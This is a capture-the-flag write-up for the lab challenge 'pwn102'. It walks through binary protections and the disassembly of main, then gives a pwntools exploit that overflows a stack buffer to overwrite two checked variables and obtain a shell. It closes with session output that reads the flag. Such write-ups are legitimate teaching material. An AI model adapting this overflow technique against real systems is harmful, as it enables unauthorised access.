# pwn102

#### Information Given

The challenge is running on port 9002

## Step 1

Check the applications security and information

```
arch     x86                                                                                                                                                                                   
baddr    0x0                                                                                                                                                                                   
binsz    6859                                                                                                                                                                                  
bintype  elf                                                                                                                                                                                   
bits     64                                                                                                                                                                                    
canary   false                                                                                                                                                                                 
injprot  false                                                                                                                                                                                 
class    ELF64                                                                                                                                                                                 
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0                                                                                                                                              
crypto   false                                                                                                                                                                                 
endian   little                                                                                                                                                                                
havecode true                                                                                                                                                                                  
intrp    /lib64/ld-linux-x86-64.so.2                                                                                                                                                           
laddr    0x0                                                                                                                                                                                   
lang     c                                                                                                                                                                                     
linenum  true                                                                                                                                                                                  
lsyms    true                                                                                                                                                                                  
machine  AMD x86-64 architecture                                                                                                                                                               
nx       true                                                                                                                                                                                  
os       linux                                                                                                                                                                                 
pic      true                                                                                                                                                                                  
relocs   true                                                                                                                                                                                  
relro    full                                                                                                                                                                                  
rpath    NONE                                                                                                                                                                                  
sanitize false                                                                                                                                                                                 
static   false                                                                                                                                                                                 
stripped false                                                                                                                                                                                 
subsys   linux                                                                                                                                                                                 
va       true
```

There is full relro, nx, pie enabled

## Step 2

Dump all funcs

```
0x00000000000006e0  _init
0x0000000000000710  puts@plt
0x0000000000000720  system@plt
0x0000000000000730  printf@plt
0x0000000000000740  setvbuf@plt
0x0000000000000750  __isoc99_scanf@plt
0x0000000000000760  exit@plt
0x0000000000000770  __cxa_finalize@plt
0x0000000000000780  _start
0x00000000000007b0  deregister_tm_clones
0x00000000000007f0  register_tm_clones
0x0000000000000840  __do_global_dtors_aux
0x0000000000000880  frame_dummy
0x000000000000088a  setup
0x00000000000008eb  banner
0x00000000000008fe  main
0x00000000000009b0  __libc_csu_init
0x0000000000000a20  __libc_csu_fini
0x0000000000000a24  _fini
```

Disassemble our main func

```
0x00000000000008fe <+0>:     push   %rbp
0x00000000000008ff <+1>:     mov    %rsp,%rbp
0x0000000000000902 <+4>:     sub    $0x70,%rsp
0x0000000000000906 <+8>:     mov    $0x0,%eax
0x000000000000090b <+13>:    call   0x88a <setup>
0x0000000000000910 <+18>:    mov    $0x0,%eax
0x0000000000000915 <+23>:    call   0x8eb <banner>
0x000000000000091a <+28>:    movl   $0xbadf00d,-0x4(%rbp)
0x0000000000000921 <+35>:    movl   $0xfee1dead,-0x8(%rbp)
0x0000000000000928 <+42>:    mov    -0x8(%rbp),%edx
0x000000000000092b <+45>:    mov    -0x4(%rbp),%eax
0x000000000000092e <+48>:    mov    %eax,%esi
0x0000000000000930 <+50>:    lea    0x212(%rip),%rdi        # 0xb49
0x0000000000000937 <+57>:    mov    $0x0,%eax
0x000000000000093c <+62>:    call   0x730 <printf@plt>
0x0000000000000941 <+67>:    lea    -0x70(%rbp),%rax
0x0000000000000945 <+71>:    mov    %rax,%rsi
0x0000000000000948 <+74>:    lea    0x217(%rip),%rdi        # 0xb66
0x000000000000094f <+81>:    mov    $0x0,%eax
0x0000000000000954 <+86>:    call   0x750 <__isoc99_scanf@plt>
0x0000000000000959 <+91>:    cmpl   $0xc0ff33,-0x4(%rbp)
0x0000000000000960 <+98>:    jne    0x992 <main+148>
0x0000000000000962 <+100>:   cmpl   $0xc0d3,-0x8(%rbp)
0x0000000000000969 <+107>:   jne    0x992 <main+148>
0x000000000000096b <+109>:   mov    -0x8(%rbp),%edx
0x000000000000096e <+112>:   mov    -0x4(%rbp),%eax
0x0000000000000971 <+115>:   mov    %eax,%esi
0x0000000000000973 <+117>:   lea    0x1ef(%rip),%rdi        # 0xb69
0x000000000000097a <+124>:   mov    $0x0,%eax
0x000000000000097f <+129>:   call   0x730 <printf@plt>
0x0000000000000984 <+134>:   lea    0x1f4(%rip),%rdi        # 0xb7f
0x000000000000098b <+141>:   call   0x720 <system@plt>
0x0000000000000990 <+146>:   jmp    0x9a8 <main+170>
0x0000000000000992 <+148>:   lea    0x1ef(%rip),%rdi        # 0xb88
0x0000000000000999 <+155>:   call   0x710 <puts@plt>
0x000000000000099e <+160>:   mov    $0x539,%edi
0x00000000000009a3 <+165>:   call   0x760 <exit@plt>
0x00000000000009a8 <+170>:   leave
0x00000000000009a9 <+171>:   ret
```

We have a 0x70 buffer

```
0x0000000000000902 <+4>:     sub    $0x70,%rsp
```

## Exploit

```python
import pwn

offset = 0x70 - 0x8
payload = b'A' * offset + pwn.p32(0xc0d3) + pwn.p32(0xc0ff33)

p = pwn.remote("10.10.60.212", 9002)
p.recvuntil(b'Am I right?')
p.sendline(payload)
p.recvuntil(b'c0d3')
p.interactive()
```

- Since the variables we want to overwrite are stored in -0x8(%rbp) and -0x4(%rbp) we set the offset to 0x70 - 0x8 for padding. 0x70 bytes will be written to reach -0x8(%rbp)

```
0x0000000000000959 <+91>:    cmpl   $0xc0ff33,-0x4(%rbp)
0x0000000000000960 <+98>:    jne    0x992 <main+148>
0x0000000000000962 <+100>:   cmpl   $0xc0d3,-0x8(%rbp)
0x0000000000000969 <+107>:   jne    0x992 <main+148>
```

- We end up at a cmpl with 0xc0ff33 in -0x4(%rbp) and 0xc0d3 -0x8(%rbp) so we add that as little endian in our payload

```sh
(.venv) ghostkey :: thm/pwn101/pwn102 » python exploit.py 
[+] Opening connection to 10.10.60.212 on port 9002: Done
[*] Switching to interactive mode

$ ls
flag.txt
pwn102
pwn102.c
$ cat flag.txt
THM{REDACTED}
$
```
